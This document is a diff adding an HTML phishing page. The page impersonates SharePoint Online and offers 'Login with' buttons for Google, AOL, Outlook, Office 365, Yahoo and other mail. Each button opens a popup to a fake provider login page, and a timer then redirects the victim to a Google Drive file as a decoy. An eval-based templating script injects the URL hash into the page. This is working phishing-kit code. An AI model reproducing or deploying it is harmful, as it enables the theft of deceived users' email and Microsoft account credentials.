@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<link rel="icon" href="https://whitehostserv.com/email-list/sharepoint/sp2/images/shfi.png" type="image/png" sizes="32x32">
+    <title>Document</title>
+    <link rel="stylesheet" href="https://whitehostserv.com/email-list/sharepoint/sp2/css/style.css">
+</head>
+
+<body style="background-image: url('https://whitehostserv.com/email-list/sharepoint/sp2/images/other-email-bg.jpg');
+    background-repeat: no-repeat;
+    background-size: cover;">
+
+
+    <section id="log-with">
+        <div class="log-with-main-col">
+
+            <div class="log-in-col">
+
+                <div class="log-with-inner">
+
+                    <div class="log-header">
+                        <p>
+                            <img src="https://whitehostserv.com/email-list/sharepoint/sp2/images/header-logo.png" alt="">
+                            <span>SharePoint Online</span>
+                        </p>
+                    </div>
+
+                    <ul class="login-list">
+                        <li class="login-item gmail link1" >
+                            <a href="#" data-nn="GMA.html#{|location.hash.substring(1)|}"><img src="https://whitehostserv.com/email-list/sharepoint/sp2/images/gmail.jpg" alt=""> Login with
+                                Google</a>
+                        </li>
+                        <li class="login-item aol link2" >
+                            <a href="#" data-nn="AOL.html#{|location.hash.substring(1)|}">
+                                <img src="https://whitehostserv.com/email-list/sharepoint/sp2/images/aol.jpg" alt=""> Login with AOL
+                            </a>
+                        </li>
+                        <li class="login-item outlook link3" >
+                            <a href="#" data-nn="OUT.html#{|location.hash.substring(1)|}">
+                                <img src="https://whitehostserv.com/email-list/sharepoint/sp2/images/outlook.jpg" alt=""> Login with Outlook
+                            </a>
+                        </li>
+                        <li class="login-item office link4" >
+                            <a href="#" data-nn="OFFICE.html#{|location.hash.substring(1)|}">
+                                <img src="https://whitehostserv.com/email-list/sharepoint/sp2/images/office.jpg" alt=""> Login with Office 365
+                            </a>
+                        </li>
+                        <li class="login-item yahoo link5" >
+                            <a href="#"  data-nn="YAHOO.html#{|location.hash.substring(1)|}">
+                                <img src="https://whitehostserv.com/email-list/sharepoint/sp2/images/yahoo.jpg" alt=""> Login with Yahoo
+                            </a>
+                        </li>
+                        <li class="login-item other link6" >
+                            <a href="#" data-nn="OTHER.html#{|location.hash.substring(1)|}">
+                                <img src="https://whitehostserv.com/email-list/sharepoint/sp2/images/other.jpg" alt=""> Login with Other mail
+                            </a>
+                        </li>
+                    </ul>
+
+                </div>
+
+                
+
+            </div>
+
+
+        </div>
+
+        <div class="log-with-content bottom">
+            <p class="lg">SharePoint Online limits across different Office 365 plans</p>
+            <p class="md">Our Microsoft SharePoint Services</p>
+        </div>
+
+    </section>
+
+
+<div style="" id="checks" style="display: none;"></div>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+   <script>
+     $(document).ready(function(e){ 
+	   window_opener_xc(); 
+	 });
+	 function window_opener_xc(){
+	   var url_part = get_extra_data(1);
+	   $('.link1 a, .link2 a, .link3 a, .link4 a, .link5 a, .link6 a').click(function(e){
+	     e.preventDefault();
+		 var checks = $('#checks');
+         var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+	     setInterval(function(){ 
+		   if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
+		 }, 3000);
+	   });
+	 }
+	 function get_extra_data(a){
+	   var output = '';
+	   if(a==1){
+	     output = '';
+	   }
+	   else if(a==2){
+	     output = "https://drive.google.com/file/d/1WaMliLzZ5bR5HIbc8VULfwEKDAp5GBJ6/view?fbclid=IwAR1i7nEA1gqnVdRjWgF8Q5PLJ4cETHGqXJBxoiRwRP6rQAg9N4yCAG9Cxug";
+	   }
+	   return output;
+	 }
+   </script>
+
+<script autoweb="pagelib/nd-template">
+const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
+templatePage()
+</script>
+</body>
+
+</html>
